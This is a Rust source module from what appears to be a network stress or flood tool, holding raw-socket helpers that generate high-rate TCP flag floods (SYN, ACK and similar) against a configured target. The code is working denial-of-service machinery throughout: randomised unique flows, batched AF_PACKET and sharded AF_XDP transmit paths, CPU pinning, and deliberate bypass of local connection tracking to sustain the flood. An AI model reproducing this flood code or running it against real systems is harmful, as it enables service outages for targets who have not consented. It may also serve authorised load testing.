//! Shared raw-socket helpers for the L3/L4 packet vectors.
//!
//! pnet's transport API is synchronous, so each vector runs its send loop on a
//! blocking thread and reads the shared atomics/watch directly. Source IPs are
//! always this host's real address — no spoofing.

use super::net::Target;
use super::packet_mmsg::AfPacketMmsg;
use super::packet_tx::{AfPacket, PacketTx};
use super::{l2, wire, Governor, Metrics, Shutdown};
use pnet_packet::ip::IpNextHeaderProtocols;
use pnet_packet::tcp::{ipv4_checksum, MutableTcpPacket, TcpFlags};
use pnet_transport::TransportChannelType::Layer4;
use pnet_transport::TransportProtocol::Ipv4;
use std::net::{IpAddr, Ipv4Addr, SocketAddr};
use std::sync::atomic::Ordering::Relaxed;
use std::sync::Arc;
use std::time::Duration;
use tracing::{info, warn};

const IPPROTO_TCP: u8 = 6;
const TCP_HDR_LEN: usize = 20; // bare TCP header, no options
const FLOOD_TTL: u8 = 64;

/// Cheap, allocation-free PRNG for per-packet randomness.
pub struct XorShift(pub u64);
impl XorShift {
    pub fn seeded(idx: u32) -> Self {
        XorShift(0x9E3779B97F4A7C15 ^ ((idx as u64).wrapping_mul(0x2545F4914F6CDD1D) | 1))
    }
    #[inline]
    pub fn next(&mut self) -> u64 {
        let mut x = self.0;
        x ^= x << 13;
        x ^= x >> 7;
        x ^= x << 17;
        self.0 = x;
        x
    }
}

/// The local IPv4 the kernel would use to reach `dst`, for checksum pseudo-headers.
pub fn local_src_ipv4(dst: SocketAddr) -> Option<Ipv4Addr> {
    let sock = std::net::UdpSocket::bind("0.0.0.0:0").ok()?;
    sock.connect(dst).ok()?;
    match sock.local_addr().ok()?.ip() {
        IpAddr::V4(v4) => Some(v4),
        IpAddr::V6(_) => None,
    }
}

/// Generic raw TCP flag flood (SYN, ACK, …). Runs the synchronous send loop on
/// a blocking thread. `flags` is a `TcpFlags` bitset.
#[allow(clippy::too_many_arguments)]
pub async fn tcp_flag_flood(
    idx: u32,
    target: Arc<Target>,
    metrics: Arc<Metrics>,
    gov: Arc<Governor>,
    shutdown: Arc<Shutdown>,
    flags: u8,
    label: &'static str,
    queue_rank: u32,
    queue_groups: u32,
) {
    let _ = tokio::task::spawn_blocking(move || {
        tcp_flag_blocking(idx, target, metrics, gov, shutdown, flags, label, queue_rank, queue_groups)
    })
    .await;
}

/// Fill a 20-byte TCP header for one flood packet from fresh PRNG output `r`.
/// Shared by both transmit paths so the packet is identical either way.
#[inline]
fn fill_tcp(
    buf: &mut [u8; TCP_HDR_LEN],
    r: u64,
    dst_port: u16,
    flags: u8,
    want_ack: bool,
    src_ip: &Ipv4Addr,
    dst_ip: &Ipv4Addr,
) {
    let src_port = 1024 + (r % 64_000) as u16;
    let seq = (r >> 16) as u32;
    let mut pkt = MutableTcpPacket::new(buf).expect("20-byte buffer fits a TCP header");
    pkt.set_source(src_port);
    pkt.set_destination(dst_port);
    pkt.set_sequence(seq);
    if want_ack {
        pkt.set_acknowledgement((r ^ 0x5DEECE66D) as u32);
    }
    pkt.set_data_offset(5);
    pkt.set_flags(flags);
    pkt.set_window(64_240);
    let checksum = ipv4_checksum(&pkt.to_immutable(), src_ip, dst_ip);
    pkt.set_checksum(checksum);
}

/// Open the AF_PACKET full-frame transmit path toward `dst_ip`, or `None` (caller
/// uses the kernel Layer-4 path). The batched AF_XDP path is sharded per NIC
/// queue in [`tcp_flag_blocking`], not here. Returns `None` only when we're not
/// root, L2 can't be resolved, or the AF_PACKET socket won't open.
fn open_fast(idx: u32, dst_ip: Ipv4Addr, label: &str) -> Option<Box<dyn PacketTx>> {
    let route = match l2::resolve(dst_ip) {
        Ok(r) => r,
        Err(e) => {
            if idx == 0 {
                warn!(vector = label, error = %e, "L2 resolve failed — using kernel transmit path");
            }
            return None;
        }
    };

    // Prefer the batched sendmmsg backend (one syscall per ~1024 frames,
    // qdisc-bypass); fall back to the plain per-frame AF_PACKET path if the raw
    // socket can't be set up.
    match AfPacketMmsg::new(&route, dst_ip, IPPROTO_TCP, TCP_HDR_LEN, FLOOD_TTL) {
        Ok(tx) => {
            if idx == 0 {
                info!(vector = label, iface = %route.iface,
                    next_hop_mac = %fmt_mac(route.next_hop_mac), mode = tx.mode(),
                    "fast path armed");
            }
            return Some(Box::new(tx));
        }
        Err(e) => {
            if idx == 0 {
                warn!(vector = label, error = %e, "sendmmsg backend failed — trying plain AF_PACKET");
            }
        }
    }

    match AfPacket::new(&route, dst_ip, IPPROTO_TCP, TCP_HDR_LEN, FLOOD_TTL) {
        Ok(tx) => {
            // Every worker opens its own socket; only the first announces it so
            // the log isn't flooded with one identical line per worker.
            if idx == 0 {
                info!(
                    vector = label,
                    iface = %route.iface,
                    next_hop_mac = %fmt_mac(route.next_hop_mac),
                    "AF_PACKET fast path armed"
                );
            }
            Some(Box::new(tx))
        }
        Err(e) => {
            if idx == 0 {
                warn!(vector = label, error = %e, "AF_PACKET setup failed — using kernel transmit path");
            }
            None
        }
    }
}

fn fmt_mac(m: [u8; 6]) -> String {
    format!("{:02x}:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}", m[0], m[1], m[2], m[3], m[4], m[5])
}

/// The fixed per-run inputs a shard needs to build every TCP packet. `Copy` so it
/// moves cheaply into each shard thread.
#[cfg(feature = "xdp")]
#[derive(Clone, Copy)]
struct TcpParams {
    dst_ip: Ipv4Addr,
    src_ip: Ipv4Addr,
    dst_port: u16,
    flags: u8,
    want_ack: bool,
}

/// One shard's send loop: fill a fresh TCP header and transmit until shutdown.
/// `gov_idx` indexes this vector's governor so ramp-up enables shards one at a
/// time; `seed` seeds the PRNG for distinct flows (spread across vectors so two
/// vectors' shards don't emit identical packets).
#[cfg(feature = "xdp")]
fn fast_send_loop(
    gov_idx: u32,
    seed: u32,
    tx: &mut dyn PacketTx,
    p: TcpParams,
    metrics: &Metrics,
    gov: &Governor,
    shutdown: &Shutdown,
) {
    const FRAME_BYTES: u64 = (wire::FRAME_PREFIX_LEN + TCP_HDR_LEN) as u64;
    let mut rng = XorShift::seeded(seed);
    let mut buf = [0u8; TCP_HDR_LEN];
    loop {
        if shutdown.is_down() {
            return;
        }
        if !gov.active(gov_idx) {
            std::thread::sleep(Duration::from_millis(100));
            continue;
        }
        fill_tcp(&mut buf, rng.next(), p.dst_port, p.flags, p.want_ack, &p.src_ip, &p.dst_ip);
        metrics.requests_sent.fetch_add(1, Relaxed);
        match tx.send_l4(&buf) {
            Ok(true) => {
                metrics.bytes_sent.fetch_add(FRAME_BYTES, Relaxed);
                // Enqueued to the wire — NOT a target response. See Metrics::packets_sent.
                metrics.packets_sent.fetch_add(1, Relaxed);
            }
            Ok(false) => {} // ring-full backpressure drop — attempted, not sent
            Err(_) => {
                metrics.errors.fetch_add(1, Relaxed);
            }
        }
    }
}

/// One shard: the CPU core to pin its thread to, and the transmit backend.
#[cfg(feature = "xdp")]
type Shard = (usize, Box<dyn PacketTx>);

/// Pin the calling thread to a single CPU (best-effort). Keeping a hot send loop
/// on one core stops the scheduler migrating it — so the frame prefix, ring
/// indices, and (when pinned to the queue's own core) the DMA'd-back completion
/// descriptors stay in that core's cache instead of being reloaded after a bounce.
#[cfg(feature = "xdp")]
fn pin_current_thread_to(cpu: usize) {
    // SAFETY: cpu_set_t is a plain bitmask; CPU_SET/sched_setaffinity have no
    // preconditions beyond a zeroed set, and pid 0 targets the calling thread.
    unsafe {
        let mut set: libc::cpu_set_t = std::mem::zeroed();
        libc::CPU_SET(cpu, &mut set);
        let _ = libc::sched_setaffinity(0, std::mem::size_of::<libc::cpu_set_t>(), &set);
    }
}

/// Run one thread per shard (each already bound to its own NIC queue and pinned to
/// a core) and block until every shard finishes. `PacketTx: Send`, so each `Box`
/// moves into its thread; the shared atomics/watch are `Arc`-cloned per shard.
#[cfg(feature = "xdp")]
fn run_shards(
    shards: Vec<Shard>,
    p: TcpParams,
    seed_base: u32,
    metrics: Arc<Metrics>,
    gov: Arc<Governor>,
    shutdown: Arc<Shutdown>,
) {
    let mut handles = Vec::with_capacity(shards.len());
    for (shard_id, (cpu, mut tx)) in shards.into_iter().enumerate() {
        let (m, g, s) = (metrics.clone(), gov.clone(), shutdown.clone());
        let gov_idx = shard_id as u32;
        let seed = seed_base.wrapping_add(shard_id as u32);
        handles.push(std::thread::spawn(move || {
            pin_current_thread_to(cpu);
            fast_send_loop(gov_idx, seed, tx.as_mut(), p, &m, &g, &s);
        }));
    }
    for h in handles {
        let _ = h.join();
    }
}

/// Build one AF_XDP sender per NIC TX queue id in `queues`, each shard pinned to
/// that queue's own core (`queue_id % ncpus`) for completion-cache locality.
/// Queues that won't bind (driver/kernel lacks the mode, or already owned) are
/// logged and skipped; the returned vector may be shorter than `queues` or empty.
#[cfg(feature = "xdp")]
fn build_xdp_backends(
    route: &l2::L2Route,
    p: &TcpParams,
    queues: &[u32],
    ncpus: usize,
    label: &str,
) -> Vec<Shard> {
    let mut shards: Vec<Shard> = Vec::with_capacity(queues.len());
    for &q in queues {
        match super::xdp::XdpTx::new(route, p.dst_ip, IPPROTO_TCP, TCP_HDR_LEN, FLOOD_TTL, q) {
            Ok(tx) => shards.push((q as usize % ncpus, Box::new(tx))),
            Err(e) => warn!(vector = label, queue = q, error = %e, "AF_XDP queue bind failed"),
        }
    }
    shards
}

/// Runtime fallback when AF_XDP won't arm: `n` AF_PACKET senders (no per-queue
/// binding limit, so several threads still parallelize the syscall path), each
/// pinned to a distinct core so they don't contend.
#[cfg(feature = "xdp")]
fn build_afpacket_backends(
    route: &l2::L2Route,
    p: &TcpParams,
    n: usize,
    ncpus: usize,
    label: &str,
) -> Vec<Shard> {
    let mut shards: Vec<Shard> = Vec::with_capacity(n);
    for i in 0..n {
        match AfPacketMmsg::new(route, p.dst_ip, IPPROTO_TCP, TCP_HDR_LEN, FLOOD_TTL) {
            Ok(tx) => shards.push((i % ncpus, Box::new(tx))),
            Err(e) => warn!(vector = label, error = %e, "AF_PACKET shard open failed"),
        }
    }
    shards
}

#[allow(clippy::too_many_arguments)]
fn tcp_flag_blocking(
    idx: u32,
    target: Arc<Target>,
    metrics: Arc<Metrics>,
    gov: Arc<Governor>,
    shutdown: Arc<Shutdown>,
    flags: u8,
    label: &'static str,
    queue_rank: u32,
    queue_groups: u32,
) {
    // Only the AF_XDP fast path uses the queue assignment; the default build
    // shares one AF_PACKET socket per worker and ignores it.
    #[cfg(not(feature = "xdp"))]
    let _ = (queue_rank, queue_groups);

    let dst = target.addr;
    let IpAddr::V4(dst_ip) = dst.ip() else {
        warn!("{label}: target is not IPv4 — skipping");
        return;
    };
    let Some(src_ip) = local_src_ipv4(dst) else {
        warn!("{label}: could not determine local IPv4 source — skipping");
        return;
    };
    let dst_port = dst.port();
    let want_ack = flags & TcpFlags::ACK != 0;

    // AF_XDP sharded fast path: one TX socket per NIC queue, each on its own
    // thread (finding F3 — a single queue caps one core against one NIC ring).
    // Only one xsk may bind a given (ifindex, queue), so worker `idx 0` owns the
    // whole pool and the other logical workers no-op; the governor still ramps by
    // enabling shards. Compiled only with `--features xdp`.
    #[cfg(feature = "xdp")]
    {
        let p = TcpParams { dst_ip, src_ip, dst_port, flags, want_ack };
        match l2::resolve(dst_ip) {
            Ok(route) => {
                if idx != 0 {
                    return; // idx 0 is the shard leader; siblings would collide on queues
                }
                // This vector's disjoint slice of the NIC's TX queues, so raw
                // vectors sharing one NIC don't fight over the same queue (EBUSY).
                let ncpus = std::thread::available_parallelism().map(|n| n.get()).unwrap_or(1);
                let nq = l2::tx_queue_count(&route.iface).min(gov.max as usize).max(1);
                let (qstart, qend) = l2::queue_slice(nq, queue_rank, queue_groups);
                let queues: Vec<u32> = (qstart..qend).collect();
                let seed_base = queue_rank.wrapping_mul(4096); // distinct flows per vector
                let (shards, mode) = if queues.is_empty() {
                    warn!(vector = label, nq, queue_rank, queue_groups,
                        "more raw vectors than NIC queues — no XDP slice, AF_PACKET fallback");
                    (build_afpacket_backends(&route, &p, 1, ncpus, label), "af_packet (no queue slice)")
                } else {
                    let xdp = build_xdp_backends(&route, &p, &queues, ncpus, label);
                    if xdp.is_empty() {
                        warn!(vector = label, "AF_XDP bound no queue — falling back to AF_PACKET shards");
                        (build_afpacket_backends(&route, &p, queues.len(), ncpus, label), "af_packet (sharded fallback)")
                    } else {
                        (xdp, "af_xdp (sharded, one socket per NIC queue)")
                    }
                };
                if !shards.is_empty() {
                    let cpus: Vec<usize> = shards.iter().map(|(c, _)| *c).collect();
                    info!(vector = label, iface = %route.iface, shards = shards.len(),
                        queues = format!("{qstart}..{qend}"), cpus = format!("{cpus:?}"), mode,
                        "fast path armed");
                    run_shards(shards, p, seed_base, metrics, gov, shutdown);
                    return;
                }
                warn!(vector = label, "no fast backend available — using kernel transmit path");
            }
            Err(e) => {
                warn!(vector = label, error = %e, "L2 resolve failed — using kernel transmit path");
            }
        }
    }

    let mut rng = XorShift::seeded(idx);
    let mut buf = [0u8; TCP_HDR_LEN];
    const FRAME_BYTES: u64 = (wire::FRAME_PREFIX_LEN + TCP_HDR_LEN) as u64;

    // Fast path: AF_PACKET full-frame injection (the default build; the `xdp`
    // build handled AF_XDP above and only reaches here if L2 resolution failed).
    // Bypasses the IP stack, netfilter OUTPUT, and — the point — local conntrack,
    // so a unique-flow flood doesn't exhaust our own state table first.
    if let Some(mut tx) = open_fast(idx, dst_ip, label) {
        loop {
            if shutdown.is_down() {
                return;
            }
            if !gov.active(idx) {
                std::thread::sleep(Duration::from_millis(100));
                continue;
            }
            fill_tcp(&mut buf, rng.next(), dst_port, flags, want_ack, &src_ip, &dst_ip);
            metrics.requests_sent.fetch_add(1, Relaxed);
            match tx.send_l4(&buf) {
                Ok(true) => {
                    metrics.bytes_sent.fetch_add(FRAME_BYTES, Relaxed);
                    // Enqueued to the wire — NOT a target response. See Metrics::packets_sent.
                    metrics.packets_sent.fetch_add(1, Relaxed);
                }
                Ok(false) => {} // driver buffer full — attempted, not sent
                Err(_) => {
                    metrics.errors.fetch_add(1, Relaxed);
                }
            }
        }
    }

    // Fallback: pnet Layer-4 (the kernel builds IP + L2). Proven, but pays the
    // full egress path including conntrack.
    let proto = Layer4(Ipv4(IpNextHeaderProtocols::Tcp));
    let (mut tx, _rx) = match pnet_transport::transport_channel(4096, proto) {
        Ok(ch) => ch,
        Err(e) => {
            warn!(error = %e, "{label}: cannot open raw socket (need root) — skipping");
            return;
        }
    };
    if idx == 0 {
        info!(vector = label, "using kernel Layer-4 transmit path");
    }

    loop {
        if shutdown.is_down() {
            return;
        }
        if !gov.active(idx) {
            std::thread::sleep(Duration::from_millis(100));
            continue;
        }
        fill_tcp(&mut buf, rng.next(), dst_port, flags, want_ack, &src_ip, &dst_ip);
        metrics.requests_sent.fetch_add(1, Relaxed);
        let pkt = MutableTcpPacket::new(&mut buf).expect("20-byte buffer fits a TCP header");
        match tx.send_to(pkt, IpAddr::V4(dst_ip)) {
            Ok(n) => {
                metrics.bytes_sent.fetch_add(n as u64, Relaxed);
                metrics.packets_sent.fetch_add(1, Relaxed);
            }
            Err(_) => {
                metrics.errors.fetch_add(1, Relaxed);
            }
        }
    }
}
